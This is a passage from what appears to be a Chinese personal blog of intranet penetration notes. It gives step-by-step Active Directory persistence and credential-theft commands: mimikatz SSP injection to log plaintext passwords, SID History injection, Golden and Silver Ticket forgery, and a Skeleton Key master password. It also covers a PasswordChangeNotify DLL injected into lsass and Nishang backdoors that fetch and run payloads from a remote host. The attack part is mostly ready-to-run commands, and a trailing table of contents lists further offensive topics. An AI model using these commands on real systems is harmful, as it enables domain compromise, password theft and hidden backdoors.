<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">方法一：</span><br><span class="line">在域控中以管理员权限启动mimikatz</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">misc</span>::<span class="title">memssp</span></span></span><br><span class="line"><span class="function">设置成功后，抓取到的明文密码会保存在<span class="title">c</span>:\<span class="title">windows</span>\<span class="title">system32</span>\<span class="title">mimilsa.log</span>文件中</span></span><br><span class="line"><span class="function">该方法重启后，就会失效，但是不会留下二进制文件</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">方法二：</span></span><br><span class="line"><span class="function">将<span class="title">mimikatz</span>的<span class="title">mimilib.dll</span>放置在<span class="title">c</span>:\<span class="title">windows</span>\<span class="title">system32</span>\目录下，并将<span class="title">mimilib.dll</span>添加到注册表中，这样即使重启也不会影响持久化，但是生效需要重启</span></span><br><span class="line"><span class="function">需要注意<span class="title">dll</span>文件的位数与操作系统的位数要相同</span></span><br><span class="line"><span class="function">修改注册表项目：</span></span><br><span class="line"><span class="function"><span class="title">HKEY_LOCAL_MACHINE</span>/<span class="title">System</span>/<span class="title">CurrentControlSet</span>/<span class="title">Control</span>/<span class="title">Lsa</span>/<span class="title">Security</span> <span class="title">Packages</span></span></span><br><span class="line"><span class="function">在该值上添加<span class="title">mimilib.dll</span>即可</span></span><br><span class="line"><span class="function"><span class="title">powershell</span>操作：</span></span><br><span class="line"><span class="function">查询注册表：</span></span><br><span class="line"><span class="function"><span class="title">reg</span> <span class="title">query</span> &quot;<span class="title">hklm</span>\<span class="title">system</span>\<span class="title">currentcontrolset</span>\<span class="title">control</span>\<span class="title">lsa</span>\&quot; /<span class="title">v</span> &quot;<span class="title">Security</span> <span class="title">Packages</span>&quot;</span></span><br><span class="line"><span class="function">添加：</span></span><br><span class="line"><span class="function"><span class="title">reg</span> <span class="title">add</span> &quot;<span class="title">hklm</span>\<span class="title">system</span>\<span class="title">currentcontrolset</span>\<span class="title">control</span>\<span class="title">lsa</span>\&quot; /<span class="title">v</span> &quot;<span class="title">Security</span> <span class="title">Packages</span>&quot; /<span class="title">d</span> &quot;<span class="title">kerberos</span>\0<span class="title">msv1_0</span>\0<span class="title">schannel</span>\0<span class="title">wdigest</span>\0<span class="title">tspkg</span>\0<span class="title">pku2u</span>\0<span class="title">mimilib</span>&quot; /<span class="title">t</span> <span class="title">REG_MULTI_SZ</span></span></span><br><span class="line"><span class="function">设置成功后，重启，抓取到的明文密码会保存在<span class="title">c</span>:\<span class="title">windows</span>\<span class="title">system32</span>\<span class="title">mimilsa.log</span>文件中</span></span><br></pre></td></tr></table></figure>

<h2 id="SID-History域后门"><a href="#SID-History域后门" class="headerlink" title="SID History域后门"></a>SID History域后门</h2><p>每个用户都有自己的SID，SID用于跟踪安全主体控制用户连接资源时的访问权限。SID History是在域迁移过程中需要使用的一个属性。</p>
<p>如果将A域中的用户迁移到B域中，那么B域中新建迁移后的用户的SID会随之改变，就会影响其用户的权限，导致无法使用本可以访问的资源。SID History的作用是在迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原有的SID添加到迁移后用户的SID History属性中，是迁移后的用户保持原有权限。</p>
<p>使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell查看test用户的SID History</span><br><span class="line">Import-Module activedirectory</span><br><span class="line">Get-ADUser test -Properties sidhistory</span><br><span class="line"></span><br><span class="line">使用mimikatz向test用户注入administrator的sid</span><br><span class="line">注入前需要使用“sid::patch”修复NTDS服务，否则无法将高权限的SID注入低权限用户的SID History属性；</span><br><span class="line">另mimilatz2.<span class="number">1</span>版本后，misc::addsid模块转移到sid::add模块下</span><br><span class="line">进入mimikatz后：</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sid</span>::<span class="title">add</span> /<span class="title">sam:test</span> /<span class="title">new:administrator</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">清除<span class="title">test</span>用户的<span class="title">SID</span> <span class="title">History</span></span></span><br><span class="line"><span class="function"><span class="title">sid</span>::<span class="title">clear</span> /<span class="title">sam:test</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">将<span class="title">SID</span> <span class="title">History</span>属性添加到用户的日志<span class="title">ID</span>为4765</span></span><br><span class="line"><span class="function">添加失败的日志为：4766</span></span><br></pre></td></tr></table></figure>

<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p><img src="/images/image-20220426202438528.png" alt="image-20220426202438528"></p>
<p>黄金票据伪造的是TGT，白银票据伪造的是ST</p>
<p>Golden Ticket 黄金票据伪造发生在第一步和第二步</p>
<p>krbtgt是KDC服务使用的账户，属于Domain Admins组。在域内，每个用户账户的票据都是由krbtgt生成的，如果获取到了krbtgt用户的NTLM或AES-256值就可以伪造任意用户的身份。</p>
<p>使用所需的条件：</p>
<p>1、需要伪造的用户名</p>
<p>2、完整域名</p>
<p>3、域SID</p>
<p>4、krbtgt的NTLM或者AES-256值</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">攻击过程：</span><br><span class="line"><span class="number">1</span>、导出krbtgt的NTLM HASH</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:mdu</span>.<span class="title">test.com</span> /<span class="title">user:krbtgt</span></span></span><br><span class="line"><span class="function">或使用十一、域控中2、导出<span class="title">ntds.dit</span>中的<span class="title">hash</span>的方法</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">2、获取域<span class="title">SID</span></span></span><br><span class="line"><span class="function"><span class="title">wmic</span> <span class="title">useraccount</span> <span class="title">get</span> <span class="title">name</span>,<span class="title">sid</span></span></span><br><span class="line"><span class="function">该命令可获取域内所有用户的<span class="title">SID</span>，找到<span class="title">krbtgt</span>用户的<span class="title">SID</span>，去除最后的-502就是域<span class="title">SID</span>，502是<span class="title">krbtgt</span>用户的标识</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">3、获取当前用户的<span class="title">SID</span></span></span><br><span class="line"><span class="function"><span class="title">whoami</span> /<span class="title">user</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">4、使用<span class="title">mimikatz</span>伪造票据</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">purge</span>   //清除票据</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">admin</span>:要伪造的用户名 /<span class="title">domian</span>:完整域名 /<span class="title">sid</span>:域<span class="title">SID</span> /<span class="title">krbtgt:krbtgt</span>的<span class="title">NTLM</span>值 /<span class="title">ticket:Administrator</span>.<span class="title">kiribi</span>     //利用<span class="title">NTLM</span>生成票据</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">5、使用<span class="title">mimikatz</span>注入票据</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">ptt</span> <span class="title">Administrator.kiribi</span>   //注入票据</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">tgt</span>  //查看注入的票据</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<h2 id="白银票据伪造"><a href="#白银票据伪造" class="headerlink" title="白银票据伪造"></a>白银票据伪造</h2><p>Silver Ticket 白银票据，Silver Ticket 利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGT。因为票据生成过程不需要使用KDC，所以可以绕过域控，很少留下日志，而黄金票据需要由KDC颁发TGT，并且在生成伪造的TGT的20分钟内，TGS不会对该TGT进行真伪校验。</p>
<p>Silver Ticket 依赖服务账号的密码Hash，不需要krbtgt账号的密码Hash，所以更隐秘。</p>
<p>黄金票据是使用krbtgt账号的密码Hash伪造的，利用伪造的高权限TGT向KDC要求颁发拥有任意权限的票据，从而实现攻击。</p>
<p>而白银票据会通过相应的服务账号来伪造TGS，如LDAP，MSSQL，WinRM，DNS等，范围有限，只能获取对应服务的权限。</p>
<p>使用所需的条件：</p>
<p>1、域名</p>
<p>2、域SID</p>
<p>3、目标服务器的FQDN</p>
<p>4、可利用的服务</p>
<p>5、服务账号的NTLM</p>
<p>6、需要伪造的用户名</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">攻击过程：</span><br><span class="line">例：伪造CIFS服务权限</span><br><span class="line">CIFS服务用于是Windows主机之间的文件共享</span><br><span class="line">使用mimikatz获取服务账号的NTLM值</span><br><span class="line">mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">使用命令行清除其他票据，以免干扰：</span><br><span class="line">klist purge</span><br><span class="line">使用mimikatz生成伪造的白银票据：</span><br><span class="line"><span class="function">kerberos::<span class="title">golden</span> /<span class="title">domain</span>:域名 /<span class="title">sid</span>:域<span class="title">SID</span> /<span class="title">target</span>:目标服务器主机名 /<span class="title">service:cifs</span> /<span class="title">rc4:NTLM</span>值 /<span class="title">user</span>:用户名 /<span class="title">ptt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">伪造其他服务只需要修改/<span class="title">service:cifs</span>参数即可</span></span><br></pre></td></tr></table></figure>

<p>其他服务如图：</p>
<p><img src="/images/image-20220426212651352.png" alt="image-20220426212651352"></p>
<h2 id="Skeleton-Key-万能密码"><a href="#Skeleton-Key-万能密码" class="headerlink" title="Skeleton Key-万能密码"></a>Skeleton Key-万能密码</h2><p>在域控上使用mimikatz注入万能密码，注入完成后，可以通过该万能密码登陆到域控。重启后会失效</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">在域控上以管理员权限打开mimikatz</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span>  权限提升</span></span><br><span class="line"><span class="function"><span class="title">misc</span>::<span class="title">skeleton</span>   注入<span class="title">Skeleton</span> <span class="title">Key</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">注入完成后可使用该管理员用户名和注入的默认的<span class="title">skeleton</span>密码“<span class="title">mimikatz</span>” 登陆到域控</span></span><br><span class="line"><span class="function">可以使用<span class="title">net</span> <span class="title">use</span> ，<span class="title">rdp</span>等</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">使用Empire</span><br><span class="line">interact xxxxxxxx  进入会话</span><br><span class="line">usemodule persistence/misc/skeleton_key*</span><br><span class="line">execute</span><br><span class="line">成功后就可以使用mimikatz进行登陆</span><br></pre></td></tr></table></figure>

<h2 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h2><p>Hook PasswordChangeNotify的作用是当用户修改密码后在系统中进行同步。攻击者可以利用该功能获取修改密码时输入的明文。</p>
<p>在修改密码时，LSA会调用PasswordFileter来检查该密码是否符合复杂度要求，如果符合，LSA就会调用PasswordChangeNotify，在系统中同步密码。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">使用Invoke-ReflectivePEInjection.ps1将HookPasswordChange.dll注入内存。</span><br><span class="line">在目标服务器上启动管理员权限的powershell后，执行：</span><br><span class="line">Import-Module .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</span><br><span class="line"></span><br><span class="line">或执行：</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1</span><br><span class="line"></span><br><span class="line">HookPasswordChange.dll下载：</span><br><span class="line"><span class="function">https://<span class="title">github.com</span>/3<span class="title">gstudent</span>/<span class="title">Hook</span>-<span class="title">PasswordChangeNotify</span>    //需要<span class="title">VS</span>编译</span></span><br><span class="line"><span class="function"><span class="title">https</span>://<span class="title">github.com</span>/<span class="title">kevien</span>/<span class="title">PasswordchangeNotify</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">当用户修改密码后就会被记录在<span class="title">C</span>:\<span class="title">windows</span>\<span class="title">temp</span>\<span class="title">password.txt</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Nishang后门"><a href="#Nishang后门" class="headerlink" title="Nishang后门"></a>Nishang后门</h2><p>① HTTP-Backdoor脚本</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">HTTP-Backdoor -CheckURL http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/<span class="number">1</span>.txt -PayloadURL hrrp://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/<span class="number">123</span>.ps1 -MagicString <span class="built_in">start</span> -StopString stop</span><br><span class="line">-CheckURL  指定检测的URL地址</span><br><span class="line">-PayloadURL 指定payload地址</span><br><span class="line">-MagicString  请求CheckURL，MagicString在返回的值中就执行payload</span><br><span class="line">-StopString   请求CheckURL，StopString在返回的值中就执行payload</span><br></pre></td></tr></table></figure>

<p>② Add-ScrnSaveBackdoor脚本</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Add-ScrnSaveBackdoor脚本利用保护程序来安插隐秘的后门</span><br><span class="line">Add-ScrnSaveBackdoor -Payload &quot;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process&quot;   //执行payload</span><br><span class="line">Add-ScrnSaveBackdoor -PayloadURL http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/Powerpreter.ps1 -Arguments HTTP-Backdoor http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/<span class="number">1</span>.txt hrrp://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/<span class="number">123</span>.ps1 <span class="built_in">start</span> stop</span><br><span class="line">//执行一个HTTP-Backdoor脚本</span><br><span class="line">Add-ScrnSaveBackdoor -PayloadURL http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/<span class="number">123</span>.ps1 </span><br></pre></td></tr></table></figure>

<p>③Execute-OnTime脚本</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Execute-OnTime脚本用于在目标主机上指定脚本的执行时间，与HTTP-Backdoor脚本使用类似，只是加了定时功能</span><br><span class="line">Execute-OnTime -PayloadURL http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/<span class="number">123</span>.ps1 -Arguments Get-Information -<span class="built_in">Time</span> <span class="number">23</span>:<span class="number">12</span> -CheckURL http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/<span class="number">1</span>.txt -StopString stop</span><br><span class="line">-PayloadURL 指定payload地址</span><br><span class="line">-Arguments  指定要执行的函数名</span><br><span class="line">-<span class="built_in">Time</span> 指定执行时间</span><br><span class="line">-CheckURL  指定检测的URL地址</span><br><span class="line">-StopString   请求CheckURL，StopString在返回的值中就执行payload</span><br></pre></td></tr></table></figure>

<p>④ Invoke-ADSBackdoor</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Invoke-ADSBackdoor能在NTFS数据流中留下永久性后门，且不易被发现</span><br><span class="line">Invoke-ADSBackdoor脚本用于向ADS注入代码并以普通用户权限运行</span><br><span class="line">Invoke-ADSBackdoor -PayloadURL http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span>/<span class="number">123</span>.ps1</span><br><span class="line">这种后门手工几乎无法找到问题，只有执行<span class="built_in">dir</span> /a /r 才能看见写入的文件</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://gabgm.com">GabgM</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://gabgm.com/2022/05/06/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">https://gabgm.com/2022/05/06/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://gabgm.com" target="_blank">GabgM</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2022/05/12/MSAT-MSSQL%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E5%B7%A5%E5%85%B7/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">MSAT-MSSQL正反向连接工具</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/36436374?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">GabgM</div><div class="author-info__description">GabgM's Blog</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/GabgM"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/GabgM" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:gabgm@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">文章仅用于技术交流与学习！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#msf"><span class="toc-number">1.</span> <span class="toc-text">msf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.1.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.</span> <span class="toc-text">命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text">后渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-number">1.4.</span> <span class="toc-text">后门</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#empire"><span class="toc-number">2.</span> <span class="toc-text">empire</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">基本使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.3.</span> <span class="toc-text">横向渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-1"><span class="toc-number">2.4.</span> <span class="toc-text">后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Empire%E5%8F%8D%E5%BC%B9%E5%9B%9EMetasploit"><span class="toc-number">2.5.</span> <span class="toc-text">Empire反弹回Metasploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nishang"><span class="toc-number">3.</span> <span class="toc-text">nishang</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8-1"><span class="toc-number">3.1.</span> <span class="toc-text">基本使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E7%A7%98%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93"><span class="toc-number">3.2.</span> <span class="toc-text">隐秘通信隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell"><span class="toc-number">3.3.</span> <span class="toc-text">WebShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">3.4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.5.</span> <span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-2"><span class="toc-number">3.6.</span> <span class="toc-text">后门</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cmd%E5%91%BD%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">cmd命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">4.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-number">4.2.</span> <span class="toc-text">内网扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3389%E7%AB%AF%E5%8F%A3"><span class="toc-number">4.3.</span> <span class="toc-text">3389端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">4.4.</span> <span class="toc-text">下载文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%95%E7%8C%B4%E6%A1%83%E6%8A%93%E5%AF%86%E7%A0%81"><span class="toc-number">4.5.</span> <span class="toc-text">猕猴桃抓密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.6.</span> <span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F"><span class="toc-number">4.7.</span> <span class="toc-text">域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Chta%E6%96%87%E4%BB%B6"><span class="toc-number">4.8.</span> <span class="toc-text">执行hta文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CS"><span class="toc-number">4.9.</span> <span class="toc-text">CS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#powershell"><span class="toc-number">5.</span> <span class="toc-text">powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text">基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powersploit"><span class="toc-number">5.2.</span> <span class="toc-text">powersploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%90%E7%A7%98%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7"><span class="toc-number">6.</span> <span class="toc-text">隐秘隧道工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ICMP%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7"><span class="toc-number">6.1.</span> <span class="toc-text">ICMP隧道工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powercat"><span class="toc-number">6.2.</span> <span class="toc-text">powercat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat"><span class="toc-number">6.3.</span> <span class="toc-text">netcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">6.4.</span> <span class="toc-text">ssh端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93-Http-Https"><span class="toc-number">6.5.</span> <span class="toc-text">应用层隧道 Http&#x2F;Https</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E9%9A%A7%E9%81%93"><span class="toc-number">6.6.</span> <span class="toc-text">DNS隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socks"><span class="toc-number">6.7.</span> <span class="toc-text">socks</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%91%BD%E4%BB%A4"><span class="toc-number">7.</span> <span class="toc-text">压缩与解压缩命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%92%8C%E4%B8%8B%E8%BD%BD"><span class="toc-number">8.</span> <span class="toc-text">文件的上传和下载</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">9.</span> <span class="toc-text">Windows权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.1.</span> <span class="toc-text">溢出漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">9.2.</span> <span class="toc-text">计划任务提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">9.3.</span> <span class="toc-text">组策略首选项提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83"><span class="toc-number">9.4.</span> <span class="toc-text">绕过UAC提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">9.5.</span> <span class="toc-text">令牌窃取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%87%AD%E8%AF%81%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E6%8F%90%E6%9D%83"><span class="toc-number">9.6.</span> <span class="toc-text">无凭证条件下的提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">10.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ipc%E8%BF%9E%E6%8E%A5"><span class="toc-number">10.1.</span> <span class="toc-text">ipc连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HASH%E8%8E%B7%E5%8F%96"><span class="toc-number">10.2.</span> <span class="toc-text">HASH获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashcat"><span class="toc-number">10.3.</span> <span class="toc-text">Hashcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-number">10.4.</span> <span class="toc-text">PTH哈希传递</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92"><span class="toc-number">10.5.</span> <span class="toc-text">票据传递</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PsExec"><span class="toc-number">10.6.</span> <span class="toc-text">PsExec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI"><span class="toc-number">10.7.</span> <span class="toc-text">WMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">10.8.</span> <span class="toc-text">MS17-010 永恒之蓝</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smbexec"><span class="toc-number">10.9.</span> <span 